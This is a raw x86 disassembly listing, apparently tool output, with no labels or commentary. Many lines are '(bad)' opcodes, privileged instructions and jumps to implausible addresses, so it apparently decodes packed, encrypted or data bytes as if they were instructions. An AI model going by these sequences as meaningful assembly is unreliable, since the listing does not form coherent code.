  40d0fa:	mov    esi,0x78b0833
  40d0ff:	sub    esp,DWORD PTR [edx+0x3]
  40d102:	int    0x8
  40d104:	mov    ecx,DWORD PTR [ebp+0xc]
  40d107:	mov    eax,esi
  40d109:	adc    bl,cl
  40d10b:	(bad)  
  40d10c:	enter  0x4d85,0xff
  40d110:	jmp    0x85d214
  40d115:	xor    eax,DWORD PTR [ebp+0x5e]
  40d118:	mov    ebp,ebx
  40d11a:	or     al,0x8b
  40d11c:	(bad)  
  40d11d:	call   0x51cd28f0
  40d122:	cmp    al,0x5
  40d124:	fs jb  0x40d0b2
  40d127:	add    BYTE PTR [eax],cl
  40d129:	leave  
  40d12a:	ror    BYTE PTR [ecx+esi*8],cl
  40d12d:	push   ebp
  40d12e:	inc    ebp
  40d12f:	in     al,dx
  40d130:	mov    ebp,esp
  40d132:	or     al,0xc7
  40d134:	(bad)  
  40d135:	lock into 
  40d137:	test   ecx,eax
  40d139:	clc    
  40d13a:	rol    BYTE PTR [ebp+0x34],1
  40d13d:	xor    al,0x45
  40d13f:	pushf  
  40d140:	add    ecx,DWORD PTR [ebx-0x7b27604]
  40d146:	mov    al,BYTE PTR [ebp-0x7b]
  40d149:	cmp    eax,0x56349c75
  40d14e:	sub    al,0xc7
  40d150:	jmp    0x40d13e
  40d152:	mov    ebx,DWORD PTR [eax]
  40d154:	lock jmp 0xf02a:0x8bb27df1
  40d15c:	mov    edx,DWORD PTR [edi-0x14]
  40d15f:	push   ecx
  40d160:	icebp  
  40d161:	xor    eax,DWORD PTR [edx]
  40d163:	mov    edx,0x627280
  40d168:	enter  0x4dc8,0xfa
  40d16c:	add    ecx,edx
  40d16e:	cld    
  40d16f:	scas   eax,DWORD PTR es:[edi]
  40d170:	add    ebx,ebp
  40d172:	dec    ebp
  40d173:	mov    ecx,DWORD PTR [ebx-0x618a1708]
  40d179:	xor    esi,DWORD PTR [edx]
  40d17b:	xor    ebp,DWORD PTR [ebx]
  40d17d:	add    esi,DWORD PTR [ebx]
  40d17f:	add    edi,DWORD PTR [ebx]
  40d181:	test   DWORD PTR [ebp-0x75],esi
  40d184:	mov    edi,eax
  40d186:	adc    BYTE PTR [ebp+0x55],cl
  40d189:	je     0x40d1be
  40d18b:	xor    esi,DWORD PTR [ebx]
  40d18d:	xor    ebp,DWORD PTR [ebx]
  40d18f:	add    ebp,DWORD PTR [ebx]
  40d191:	add    esi,DWORD PTR [ebx]
  40d193:	ror    DWORD PTR [ecx+0x68ec108b],cl
  40d199:	enter  0xcaff,0x8b
  40d19d:	icebp  
  40d19e:	or     al,0xa
  40d1a0:	(bad)  
  40d1a1:	lock retf 
  40d1a3:	enter  0xf2c8,0x4d
  40d1a7:	retf   0xee89
  40d1aa:	or     BYTE PTR [ebp+0x45],dh
  40d1ad:	mov    edi,DWORD PTR [ebx]
  40d1af:	cld    
  40d1b0:	bswap  eax
  40d1b2:	pop    edi
  40d1b3:	mov    esp,0x328b9eff
  40d1b8:	in     al,0x8b
  40d1ba:	(bad)  
  40d1bb:	hlt    
  40d1bc:	pop    ebx
  40d1bd:	jne    0x40d1c7
  40d1bf:	xor    eax,DWORD PTR [ebp+0x33]
  40d1c2:	xor    eax,0x73b082b
  40d1c7:	jbe    0x40d167
  40d1c9:	mov    esi,DWORD PTR [edx]
  40d1cb:	clc    
  40d1cc:	pop    edi
  40d1cd:	mov    edx,eax
  40d1cf:	mov    eax,DWORD PTR [eax]
  40d1d1:	clc    
  40d1d2:	mov    ecx,ecx
  40d1d4:	adc    DWORD PTR [ebp+0x14],0xffffffec
  40d1d8:	inc    ebp
  40d1d9:	in     al,dx
  40d1da:	xor    eax,0xc7009c04
  40d1df:	inc    ebp
  40d1e0:	cld    
  40d1e1:	xor    eax,0xc7f89c85
  40d1e6:	add    esi,esp
  40d1e8:	inc    ebp
  40d1e9:	test   edi,eax
  40d1eb:	clc    
  40d1ec:	hlt    
  40d1ed:	inc    ebp
  40d1ee:	test   DWORD PTR ds:0x53579cf8,esi
  40d1f4:	inc    ebp
  40d1f5:	inc    ebp
  40d1f6:	aad    0x36
  40d1f8:	xlat   BYTE PTR ds:[ebx]
  40d1f9:	pushf  
  40d1fa:	mov    ecx,DWORD PTR [ebx-0x41b21304]
  40d200:	mov    eax,0x7070808
  40d205:	xor    edi,eax
  40d207:	mov    edi,0x32729e
  40d20c:	xor    eax,edi
  40d20e:	add    eax,DWORD PTR [ebp+0x3]
  40d211:	(bad)  
  40d212:	pavgb  mm7,mm1
  40d215:	test   DWORD PTR [esi-0x8],eax
  40d218:	dec    ebp
  40d219:	inc    ebp
  40d21a:	mov    edx,ebp
  40d21c:	cld    
  40d21d:	xlat   BYTE PTR ds:[ebx]
  40d21e:	enter  0xf0c7,0xf0
  40d222:	retf   0xf200
  40d225:	add    dh,cl
  40d227:	leave  
  40d228:	jne    0x40d26f
  40d22a:	mov    ecx,DWORD PTR [ebx-0x39ea1304]
  40d230:	enter  0xf0ce,0xc7
  40d234:	retf   0xf2cf
  40d237:	scas   eax,DWORD PTR es:[edi]
  40d238:	out    dx,al
  40d239:	jmp    0x40d288
  40d23b:	mov    esi,DWORD PTR [ebx]
  40d23d:	cld    
  40d23e:	add    eax,edi
  40d240:	xor    eax,esi
  40d242:	jmp    0x40d289
  40d244:	xor    ecx,DWORD PTR [ebp-0x1ffc07cd]
  40d24a:	add    edi,edi
  40d24c:	ror    DWORD PTR [ecx+0x45f8f889],cl
  40d252:	dec    ebp
  40d253:	mov    esi,DWORD PTR [ebx]
  40d255:	cld    
  40d256:	lea    eax,[edi+ecx*1+0xff72e0]
  40d25d:	mov    ecx,DWORD PTR [ebp-0xc]
  40d260:	mov    ecx,DWORD PTR [ebp-0x4]
  40d263:	xor    esi,eax
  40d265:	(bad)  
  40d266:	enter  0xce08,0x72
  40d26a:	stc    
  40d26b:	add    BYTE PTR [edx+0x5f8b4545],ch
  40d271:	call   0x33861f79
  40d276:	pop    esi
  40d277:	xor    eax,ebx
  40d279:	sub    ecx,DWORD PTR [ebx+0x20fc818b]
  40d27f:	enter  0xb900,0xc7
  40d283:	inc    ebp
  40d284:	in     al,dx
  40d285:	xor    eax,DWORD PTR [ebp+0x4589f803]
  40d28b:	clc    
  40d28c:	xor    al,0x45
  40d28e:	pushf  
  40d28f:	ss (bad) 
  40d291:	pushf  
  40d292:	call   0xf92c5922
  40d297:	mov    eax,edi
  40d299:	loopne 0x40d27f
  40d29b:	inc    ebp
  40d29c:	test   DWORD PTR [ebx],esi
  40d29e:	clc    
  40d29f:	add    eax,DWORD PTR [ebp-0x2d]
  40d2a2:	push   esi
  40d2a3:	mov    DWORD PTR [edi-0x4],edx
  40d2a6:	push   ecx
  40d2a7:	inc    ebp
  40d2a8:	push   edi
  40d2a9:	mov    al,dh
  40d2ab:	mov    BYTE PTR [esi+0x34d320b],bl
  40d2b1:	mov    ecx,DWORD PTR [ecx+0x45b6f8f8]
  40d2b7:	xor    edi,DWORD PTR ds:0xc7089c89
  40d2bd:	dec    ebp
  40d2be:	cld    
  40d2bf:	mov    ebx,DWORD PTR [eax]
  40d2c1:	or     dl,ch
  40d2c3:	into   
  40d2c4:	inc    ebp
  40d2c5:	iret   
  40d2c6:	or     dl,cl
  40d2c8:	add    BYTE PTR [ebx+ecx*4-0xb007420],cl
  40d2cf:	mov    ecx,DWORD PTR [ebp-0x4]
  40d2d2:	xor    ecx,edx
  40d2d4:	xor    ecx,DWORD PTR [ebp+0x3]
  40d2d7:	mov    eax,DWORD PTR [ebx]
  40d2d9:	hlt    
  40d2da:	bswap  esi
  40d2dc:	rol    DWORD PTR [ecx+esi*1+0x2b32459e],0x89
  40d2e4:	xor    ecx,DWORD PTR [eax]
  40d2e6:	mov    DWORD PTR [ebp-0x8],eax
  40d2e9:	xor    ebx,DWORD PTR [ebp-0x47]
  40d2ec:	call   0x40d17e
  40d2f1:	enter  0x4d45,0x8b
  40d2f5:	mov    eax,edi
  40d2f7:	lock dec ebp
  40d2f9:	inc    ebp
  40d2fa:	mov    DWORD PTR [ebx-0x39040f73],ecx
  40d300:	inc    edi
  40d302:	inc    ebp
  40d303:	enter  0x918b,0xfc
  40d307:	inc    ebp
  40d308:	(bad)  
  40d309:	mov    eax,DWORD PTR [eax+edi*8-0x38cd3962]
  40d310:	mov    DWORD PTR [esi-0x4],ebx
  40d313:	rol    DWORD PTR [ebp-0x37],0x8b
  40d317:	add    al,0xf4
  40d319:	push   ebp
  40d31a:	into   
  40d31b:	in     al,dx
  40d31c:	mov    BYTE PTR [ebp-0x3f],0x8b
  40d320:	dec    ebp
  40d321:	or     BYTE PTR [ebx],bh
  40d323:	xor    BYTE PTR [esi+0x1],0x8b
  40d327:	add    ah,ah
  40d329:	add    dh,al
  40d32b:	in     al,dx
  40d32c:	(bad)  
  40d32d:	push   ebx
  40d32e:	inc    ebp
  40d32f:	mov    eax,edi
  40d331:	adc    al,ch
  40d333:	push   ss
  40d334:	xchg   BYTE PTR [edi+0x7db08f8],bh
  40d33a:	popa   
  40d33b:	iret   
  40d33c:	dec    ebp
  40d33d:	sahf   
  40d33e:	mov    esi,DWORD PTR [edx]
  40d340:	clc    
  40d341:	add    ecx,esi
  40d343:	cmp    ecx,edi
  40d345:	jne    0x40d32f
  40d347:	add    DWORD PTR [ebp-0x62],0x4208648b
  40d34e:	or     BYTE PTR [ebx+0x48ae94d],bl
  40d354:	or     eax,DWORD PTR [eax]
  40d356:	push   ebp
  40d357:	dec    ebp
  40d358:	jnp    0xd00ae027
  40d35e:	dec    ebp
  40d35f:	xlat   BYTE PTR ds:[ebx]
  40d360:	mov    ecx,ebx
  40d362:	call   0x340b293a
  40d367:	lsl    ecx,WORD PTR ds:0x7f8b2d23
  40d36e:	(bad)  
  40d36f:	cld    
  40d370:	sti    
  40d371:	lahf   
  40d372:	(bad)  
  40d373:	mov    ebp,0x8b330055
  40d378:	mov    DWORD PTR [eax],ecx
  40d37a:	clc    
  40d37b:	iret   
  40d37c:	dec    ebp
  40d37d:	retf   
  40d37e:	xor    eax,ecx
  40d380:	lea    eax,[eax+ecx*1+0x7204]
  40d387:	dec    ebp
  40d388:	inc    ebp
  40d389:	mov    DWORD PTR [ebx-0x39b20b24],ecx
  40d38f:	mov    esp,DWORD PTR [edx+0x14]
  40d392:	int    0x6
  40d394:	sub    eax,DWORD PTR [ebp+0x3]
  40d397:	(bad)  
  40d398:	lock or BYTE PTR [ebp-0x7b],cl
  40d39c:	mov    edi,eax
  40d39e:	in     al,dx
  40d39f:	xor    al,0x4d
  40d3a1:	pushf  
  40d3a2:	xor    ecx,DWORD PTR [ecx+0x453bf003]
  40d3a8:	jne    0x40d333
  40d3aa:	mov    ebx,DWORD PTR [eax]
  40d3ac:	in     al,0x45
  40d3ae:	dec    ebp
  40d3af:	mov    esi,DWORD PTR [ebx]
  40d3b1:	nop
  40d3b2:	add    eax,DWORD PTR [eax]
  40d3b4:	pop    edi
  40d3b5:	mov    esi,DWORD PTR [ebx]
  40d3b7:	mov    DWORD PTR [ebx-0x2c],ebx
  40d3ba:	ret    0x4d
  40d3bd:	mov    ecx,DWORD PTR [ebx+0x18008b90]
  40d3c3:	mov    ecx,DWORD PTR [ebp+0x3]
  40d3c6:	mov    edi,DWORD PTR [eax+edx*4]
  40d3c9:	dec    ebp
  40d3ca:	add    BYTE PTR [ebx-0x387cf775],cl
  40d3d0:	jo     0x40d395
  40d3d2:	push   esi
  40d3d3:	inc    ebp
  40d3d4:	jne    0x40d361
  40d3d6:	mov    ecx,DWORD PTR [eax]
  40d3d8:	push   edi
  40d3d9:	(bad)  
  40d3da:	push   edi
  40d3db:	ret    
  40d3dc:	push   ecx
  40d3dd:	inc    ebp
  40d3de:	xor    ecx,DWORD PTR [ebx+0x40720cbb]
  40d3e4:	add    BYTE PTR [ebx+0x45d10ccb],al
  40d3ea:	jnp    0x406de01d
  40d3f0:	jg     0x40d37d
  40d3f2:	jmp    0x54:0xde85700c
  40d3f9:	inc    ebp
  40d3fa:	mov    esi,DWORD PTR [eax+ecx*1-0x75]
  40d3fe:	push   ebp
  40d3ff:	cmp    BYTE PTR [ebx],dh
  40d401:	dec    ebp
  40d402:	xor    ecx,DWORD PTR [ebx-0x8fcabfd]
  40d408:	cmp    esp,DWORD PTR [ebx]
  40d40a:	jne    0x40d397
  40d40c:	or     DWORD PTR [esi+ebx*4],0xef036440
  40d413:	jmp    0x40d42a
  40d415:	mov    ebp,ecx
  40d417:	push   esp
  40d418:	add    al,0x45
  40d41a:	add    BYTE PTR [ebx-0x38ccf7b3],cl
  40d420:	add    eax,ebx
  40d422:	cmp    eax,DWORD PTR [ebp+0xf]
  40d425:	mov    esp,DWORD PTR [eax+ecx*1-0x3c743900]
  40d42c:	sbb    BYTE PTR [ebp+0x45],al
  40d42f:	mov    ecx,DWORD PTR [ecx+0x4d4d1808]
  40d435:	xor    ecx,DWORD PTR [ebx-0x277676fd]
  40d43b:	mov    DWORD PTR [ebp+0x14],eax
  40d43e:	xor    eax,0xba339c45
  40d443:	pushf  
  40d444:	test   edi,eax
  40d446:	clc    
  40d447:	adc    al,0x55
  40d449:	test   DWORD PTR [ebx+0x454518f8],ecx
  40d44f:	xor    DWORD PTR [ebx-0x7f74e764],ecx
  40d455:	lock add DWORD PTR [ebp+0x0],ecx
  40d459:	xor    eax,DWORD PTR [eax]
  40d45b:	add    ecx,DWORD PTR [ebp+0xf]
  40d45e:	mov    eax,ecx
  40d460:	sbb    BYTE PTR [ebp-0x77],cl
  40d463:	mov    eax,DWORD PTR [ecx]
  40d465:	rol    BYTE PTR [eax],1
  40d467:	iret   
  40d468:	or     DWORD PTR [eax+ecx*2+0xc32899e],ecx
  40d46f:	cmp    eax,DWORD PTR [ebp+0xf]
  40d472:	xor    ebp,DWORD PTR [ebx+eax*1-0xb747700]
  40d479:	or     BYTE PTR [ebp-0x39],al
  40d47c:	xor    eax,ebx
  40d47e:	add    eax,DWORD PTR [ebp-0x77]
  40d481:	mov    edx,DWORD PTR [eax+ebx*1]
  40d484:	inc    ebp
  40d485:	inc    ebp
  40d486:	mov    ecx,DWORD PTR [ecx+0x75e8f450]
  40d48c:	mov    DWORD PTR [ebx+0x4d45dcd0],ecx
  40d492:	mov    ebp,eax
  40d494:	cmp    cl,dh
  40d496:	dec    ebp
  40d497:	dec    DWORD PTR [eax+0x45]
  40d49a:	inc    ecx
  40d49b:	(bad)  
  40d49c:	mov    esp,eax
  40d49e:	or     al,0x85
  40d4a0:	sbb    al,bh
  40d4a2:	inc    eax
  40d4a3:	inc    ebp
  40d4a4:	mov    esi,DWORD PTR [ebx]
  40d4a6:	or     al,0x3
  40d4a8:	dec    ecx
  40d4a9:	push   eax
  40d4aa:	dec    eax
  40d4ab:	inc    ebp
  40d4ac:	rcl    BYTE PTR [eax-0x38],1
  40d4af:	push   eax
  40d4b0:	inc    ebp
  40d4b1:	dec    DWORD PTR [ebx-0x3e07c775]
  40d4b7:	rol    BYTE PTR [ebx],0x4e
  40d4ba:	inc    eax
  40d4bb:	inc    ebp
  40d4bc:	mov    DWORD PTR [ebx],esi
  40d4be:	sbb    BYTE PTR [ebx],al
  40d4c0:	inc    ebp
  40d4c1:	push   eax
  40d4c2:	xor    esi,DWORD PTR [ebp+0x3]
  40d4c5:	lea    ecx,[ecx+0x45e814b8]
  40d4cb:	cmc    
  40d4cc:	xor    edi,edi
  40d4ce:	add    eax,DWORD PTR [ebp-0x77]
  40d4d1:	mov    DWORD PTR [eax+eiz*8],edx
  40d4d4:	inc    ebp
  40d4d5:	inc    ebp
  40d4d6:	mov    ecx,DWORD PTR [ebx-0x3e38232c]
  40d4dc:	ret    
  40d4dd:	inc    ebp
  40d4de:	add    DWORD PTR [ebx+0x4dc7f855],ecx
  40d4e4:	adc    al,0x8b
  40d4e6:	test   DWORD PTR [eax],edx
  40d4e8:	clc    
  40d4e9:	inc    ecx
  40d4ea:	inc    ebp
  40d4eb:	mov    esi,DWORD PTR [edx]
  40d4ed:	loopne 0x40d48b
  40d4ef:	enter  0x16c7,0x14
  40d4f3:	inc    ebp
  40d4f4:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  40d4fa:	mov    eax,DWORD PTR [ebx]
  40d4fc:	sbb    BYTE PTR [eax],cl
  40d4fe:	(bad)  
  40d4ff:	dec    ebp
  40d500:	ret    
  40d501:	sub    ebp,DWORD PTR [edi+0x8028be9]
  40d507:	add    BYTE PTR [ebp+0xc],dl
  40d50a:	xor    esi,DWORD PTR [ebp-0x73]
  40d50d:	lea    edx,[ecx]
  40d50f:	lods   al,BYTE PTR ds:[esi]
  40d510:	jb     0x40d4fa
  40d512:	add    ch,dh
  40d514:	sar    edi,0x83
  40d517:	xor    eax,0x89009c03
  40d51c:	inc    ebp
  40d51d:	int3   
  40d51e:	xor    eax,DWORD PTR [ebp+0x3]
  40d521:	xor    al,0x89
  40d523:	pushf  
  40d524:	adc    al,0xc7
  40d526:	inc    ebp
  40d527:	les    eax,FWORD PTR [ebx]
  40d529:	test   esp,ebx
  40d52b:	clc    
  40d52c:	inc    ebp
  40d52d:	inc    ebp
  40d52e:	push   DWORD PTR [edx]
  40d530:	hlt    
  40d531:	pushf  
  40d532:	jne    0x40d4c1
  40d534:	mov    ecx,esp
  40d536:	or     al,0x4d
  40d538:	bound  ecx,QWORD PTR [ebp+0x4d89c8ff]
  40d53e:	clc    
  40d53f:	lea    eax,[ebp-0x3c]
  40d542:	cmp    eax,0x8b8d9c4d
  40d547:	shl    al,0x4d
  40d54a:	(bad)  
  40d54b:	mov    eax,ebx
  40d54d:	or     BYTE PTR [ebp-0x17344731],cl
  40d553:	dec    ebp
  40d554:	imul   ecx
  40d556:	inc    DWORD PTR [ecx]
  40d558:	inc    ebp
  40d559:	add    BYTE PTR [ebp-0x74638bcd],al
  40d55f:	pavgb  mm7,mm6
  40d562:	mov    DWORD PTR [eax],0xf0ff8bc3
  40d568:	clc    
  40d569:	iret   
  40d56a:	inc    ebp
  40d56b:	lock push eax
  40d56d:	retf   
  40d56e:	fmul   QWORD PTR [ebp-0x1]
  40d571:	mov    ecx,DWORD PTR [ebx+0x45f7f4e0]
  40d577:	test   BYTE PTR [ebx+0x4d32e09e],cl
  40d57d:	mov    DWORD PTR [ebx],ebp
  40d57f:	loopne 0x40d50a
  40d581:	inc    ebp
  40d582:	loopne 0x40d50f
  40d584:	inc    ebp
  40d585:	loopne 0x40d512
  40d587:	xbegin 0x4091650
  40d58d:	adc    ecx,DWORD PTR [eax*2+0x33b334d]
  40d594:	jb     0x40d5e6
  40d596:	mov    ecx,DWORD PTR [eax+edi*8]
  40d599:	inc    ebp
  40d59a:	inc    eax
  40d59b:	push   eax
  40d59c:	mov    ebx,DWORD PTR [edi-0x8]
  40d59f:	inc    DWORD PTR [ecx-0x75]
  40d5a2:	mov    ebp,esp
  40d5a4:	loopne 0x40d5a6
  40d5a6:	rol    edi,0xee
  40d5a9:	test   BYTE PTR [eax],al
  40d5ab:	dec    edx
  40d5ac:	push   0x32
  40d5ae:	dec    DWORD PTR [ebx-0x30baf70c]
  40d5b4:	push   eax
  40d5b5:	mov    dh,0x94
  40d5b7:	add    edi,edi
  40d5b9:	cmp    edi,DWORD PTR [eax-0x7877af1]
  40d5bf:	add    BYTE PTR [ebp-0x75],al
  40d5c2:	(bad)  
  40d5c3:	call   0xc7c5d690
  40d5c8:	clc    
  40d5c9:	test   BYTE PTR [ebp+0x4a],al
  40d5cc:	xor    esi,DWORD PTR [edx]
  40d5ce:	pushf  
  40d5cf:	mov    eax,edi
  40d5d1:	or     al,al
  40d5d3:	iret   
  40d5d4:	test   DWORD PTR [esi+0x3b4d03f8],esi
  40d5da:	mov    DWORD PTR [edi],ecx
  40d5dc:	in     al,dx
  40d5dd:	pop    eax
  40d5de:	dec    ebp
  40d5df:	add    BYTE PTR [ecx+0x4df8e88b],cl
  40d5e5:	add    BYTE PTR [ecx+0x4d84f8c7],cl
  40d5eb:	dec    edx
  40d5ec:	mov    DWORD PTR [edx],esi
  40d5ee:	in     al,0x8b
  40d5f0:	dec    ebp
  40d5f1:	or     BYTE PTR [ebx],dh
  40d5f3:	iret   
  40d5f4:	add    esi,DWORD PTR [esi+0x3be00389]
  40d5fa:	test   DWORD PTR [edi],0x3d3800
  40d600:	test   DWORD PTR [ebx+0x84e4f8],ecx
  40d606:	add    edi,eax
  40d608:	add    BYTE PTR [ebp+ecx*2-0x74cdccb6],al
  40d60f:	mov    eax,DWORD PTR [ebx]
  40d611:	or     BYTE PTR [ecx+0x45b614cf],cl
  40d617:	add    esi,DWORD PTR [ebx]
  40d619:	cmp    ecx,DWORD PTR [ebp+0x7218300f]
  40d61f:	add    BYTE PTR [eax],al
  40d621:	mov    eax,DWORD PTR [ebp-0x18]
  40d624:	mov    eax,DWORD PTR [eax]
  40d626:	lock (bad) 
  40d628:	dec    ebp
  40d629:	test   BYTE PTR [ebx],dh
  40d62b:	dec    edx
  40d62c:	add    esi,DWORD PTR [edx]
  40d62e:	cmp    ecx,DWORD PTR [ebx+0x98bec75]
  40d634:	or     bh,cl
  40d636:	(bad)  
  40d637:	mov    ebx,es
  40d639:	dec    edx
  40d63a:	push   0x32
  40d63c:	lea    esi,[edx]
  40d63e:	lods   al,BYTE PTR ds:[esi]
  40d63f:	mov    ebp,eax
  40d641:	clc    
  40d642:	cli    
  40d643:	or     edi,edi
  40d645:	iret   
  40d646:	inc    ebp
  40d647:	mov    WORD PTR [ebx-0x75cdccb6],cs
  40d64d:	or     al,BYTE PTR ds:0xec728b
  40d653:	or     DWORD PTR [ebp-0x31],ecx
  40d656:	xor    ecx,DWORD PTR [edi+ecx*1-0x34cd3fb2]
  40d65d:	cmp    al,cl
  40d65f:	je     0x40d839
  40d665:	mov    eax,DWORD PTR [ebp-0x8]
  40d668:	mov    eax,DWORD PTR [eax]
  40d66a:	xor    eax,edi
  40d66c:	mov    al,BYTE PTR [ebp+eax*1+0x32724a]
  40d673:	mov    ecx,DWORD PTR [ebp-0x18]
  40d676:	xor    ecx,DWORD PTR [ecx]
  40d678:	bswap  edi
  40d67a:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb6],0x32
  40d682:	add    DWORD PTR [ebx+0x945e400],ecx
  40d688:	mov    ecx,edi
  40d68a:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054a]
  40d691:	or     al,BYTE PTR [eax]
  40d693:	mov    ecx,DWORD PTR [ebp-0x18]
  40d696:	xor    ecx,DWORD PTR [ecx]
  40d698:	bswap  edi
  40d69a:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb2],0x3a
  40d6a2:	add    DWORD PTR [edi],ecx
  40d6a4:	add    BYTE PTR [eax-0x7474ffbb],dl
  40d6aa:	xor    esp,esp
  40d6ac:	mov    al,BYTE PTR [eax]
  40d6ae:	add    eax,0x8472c7
  40d6b3:	dec    edx
  40d6b4:	dec    ebp
  40d6b5:	xor    dh,BYTE PTR [ebx]
  40d6b7:	mov    ecx,DWORD PTR [edi]
  40d6b9:	clc    
  40d6ba:	ror    BYTE PTR [ecx],0xcb
  40d6bd:	iret   
  40d6be:	ror    DWORD PTR [esp+eax*4+0x32014a],0x32
  40d6c6:	inc    ebp
  40d6c7:	mov    ecx,DWORD PTR [ebx-0x75f6cc14]
  40d6cd:	iret   
  40d6ce:	add    eax,0x4a728c
  40d6d3:	xor    cl,BYTE PTR [ebp+0xa]
  40d6d6:	mov    ecx,DWORD PTR [ebx+0x98af833]
  40d6dc:	or     eax,0x8c72cf
  40d6e1:	dec    esi
  40d6e2:	shl    DWORD PTR [edx],0x4d
  40d6e5:	cmp    cl,BYTE PTR [ebx-0x7574cc8b]
  40d6eb:	in     al,0xd
  40d6ed:	add    BYTE PTR [edx-0x39],dh
  40d6f0:	add    BYTE PTR [ecx+eax*8-0x74cdb2b6],al
  40d6f7:	mov    esi,DWORD PTR [ebx]
  40d6f9:	in     al,dx
  40d6fa:	mov    cl,BYTE PTR [ecx]
  40d6fc:	or     eax,0x8c72cf
  40d701:	dec    edx
  40d702:	enter  0x8532,0x32
  40d706:	add    BYTE PTR [ebx+0x945e800],cl
  40d70c:	mov    ecx,edi
  40d70e:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054a]
  40d715:	or     al,BYTE PTR [eax]
  40d717:	mov    ecx,DWORD PTR [ebp-0x1c]
  40d71a:	mov    ecx,DWORD PTR [ecx]
  40d71c:	xor    ecx,edi
  40d71e:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724e]
  40d725:	cmp    al,cl
  40d727:	jne    0x40d776
  40d729:	lea    ecx,[ebx-0x7517cc54]
  40d72f:	cli    
  40d730:	or     eax,0x4d72ff
  40d735:	cmp    eax,ecx
  40d737:	je     0x40d786
  40d739:	mov    ecx,DWORD PTR [ebx-0x7538ccf8]
  40d73f:	ret    
  40d740:	or     eax,0x8b7245
  40d745:	lock enter 0x85c7,0x84
  40d74a:	add    BYTE PTR [esi+0x33453200],bl
  40d750:	mov    ecx,DWORD PTR [ebx+0x558a0833]
  40d756:	add    eax,0x37233
  40d75b:	cmp    ecx,DWORD PTR [ebp+0xf]
  40d75e:	mov    esi,edi
  40d760:	xor    edi,edi
  40d762:	mov    cl,BYTE PTR [ebx+0x4d72080d]
  40d768:	add    BYTE PTR [ebx],dh
  40d76a:	rol    DWORD PTR [ebx],0x4d
  40d76d:	cmp    ecx,DWORD PTR [ebx-0x7574cc8b]
  40d773:	lock or eax,0x33724d
  40d779:	(bad)  
  40d77a:	ror    DWORD PTR [eax],0x4d
  40d77d:	jb     0x40d70a
  40d77f:	add    BYTE PTR [ebx],dh
  40d781:	ja     0x40d70d
  40d783:	sbb    BYTE PTR ds:0x8d7275,cl
  40d789:	xchg   esp,eax
  40d78a:	enter  0x50e8,0xf3
  40d78e:	inc    ebp
  40d78f:	dec    DWORD PTR [ebx-0x7574ccbb]
  40d795:	loopne 0x40d79c
  40d797:	(bad)  
  40d798:	jb     0x40d75d
  40d79a:	add    cl,al
  40d79c:	dec    ebp
  40d79d:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  40d7a3:	add    ecx,DWORD PTR ds:0x187250
  40d7a9:	inc    ebp
  40d7aa:	rcl    DWORD PTR [eax+0x4d],0x4f
  40d7ae:	mov    edi,edi
  40d7b0:	xor    ecx,DWORD PTR [ebx-0x3ff20b76]
  40d7b6:	jb     0x40d741
  40d7b8:	add    BYTE PTR [ecx+eax*8],dl
  40d7bb:	jne    0x40d80a
  40d7bd:	dec    DWORD PTR [ebx-0x75baccec]
  40d7c3:	add    ecx,DWORD PTR ds:0xe872d8
  40d7c9:	repnz enter 0x10ff,0x45
  40d7ce:	inc    ebp
  40d7cf:	mov    edx,DWORD PTR [eax-0x20]
  40d7d2:	mov    ds:0x8bc3ffc7,eax
  40d7d7:	shl    DWORD PTR [ecx+edx*1+0x750a00c1],0x45
  40d7df:	mov    esi,DWORD PTR [ebx]
  40d7e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d7e2:	add    eax,DWORD PTR [ebp-0x77]
  40d7e5:	push   eax
  40d7e6:	adc    al,0x15
  40d7e8:	inc    ebp
  40d7e9:	push   DWORD PTR [ebx]
  40d7eb:	mov    ecx,DWORD PTR [ebp+0x724d30d4]
  40d7f1:	add    DWORD PTR [eax],eax
  40d7f3:	mov    eax,edi
  40d7f5:	test   al,0x4d
  40d7f7:	inc    ebp
  40d7f8:	mov    ecx,DWORD PTR [ecx+0x45cf1814]
  40d7fe:	retf   
  40d7ff:	mov    edx,ecx
  40d801:	sbb    BYTE PTR [edi+eax*8-0x50003c03],al
  40d808:	inc    ebp
  40d809:	mov    ecx,DWORD PTR [ebx-0x38aaebf8]
  40d80f:	xor    eax,ebx
  40d811:	(bad)  
  40d812:	enter  0x1111,0x72
  40d816:	inc    ebp
  40d817:	add    BYTE PTR [ebx-0x387de73f],cl
  40d81d:	cld    
  40d81e:	test   bh,bh
  40d820:	sahf   
  40d821:	jne    0x40d855
  40d823:	mov    ebp,ebx
  40d825:	fsubr  DWORD PTR [edx+0x6]
  40d828:	dec    DWORD PTR [edx]
  40d82a:	hlt    
  40d82b:	xor    eax,0x7f502d45
  40d830:	sbb    ch,ah
  40d832:	call   DWORD PTR [edx-0x75]
  40d835:	pop    esi
  40d836:	or     cl,cl
  40d838:	dec    ebp
  40d839:	adc    al,0x33
  40d83b:	push   ebp
  40d83c:	add    ebp,esp
  40d83e:	cmp    esp,esp
  40d840:	je     0x40d7c5
  40d842:	mov    esp,DWORD PTR [eax]
  40d844:	or     BYTE PTR ds:0x89c39cc7,dh
  40d84a:	push   0x24
  40d84c:	lea    ecx,[ebp+0x44e8ff94]
  40d852:	clc    
  40d853:	or     al,0xff
  40d855:	push   esp
  40d856:	inc    ebp
  40d857:	or     BYTE PTR [ebx+0x450818be],al
  40d85d:	pop    es
  40d85e:	call   esi
  40d860:	test   al,0xbf
  40d862:	jne    0x40d8d6
  40d864:	mov    eax,DWORD PTR [eax]
  40d866:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d867:	xlat   BYTE PTR ds:[ebx]
  40d868:	inc    ebp
  40d869:	push   esp
  40d86a:	push   eax
  40d86b:	or     al,0xde
  40d86d:	push   ebp
  40d86e:	dec    DWORD PTR [ecx-0x74f7db75]
  40d874:	dec    ebp
  40d875:	adc    BYTE PTR [ebx],dh
  40d877:	rol    DWORD PTR [ebx],1
  40d879:	sbb    BYTE PTR [ebx],bh
  40d87b:	dec    esp
  40d87c:	je     0x40d892
  40d87e:	push   0x54
  40d880:	call   DWORD PTR [eax]
  40d882:	test   al,0xce
  40d884:	inc    ebp
  40d885:	iret   
  40d886:	add    ebp,DWORD PTR [edi+0x24e889d8]
  40d88c:	clc    
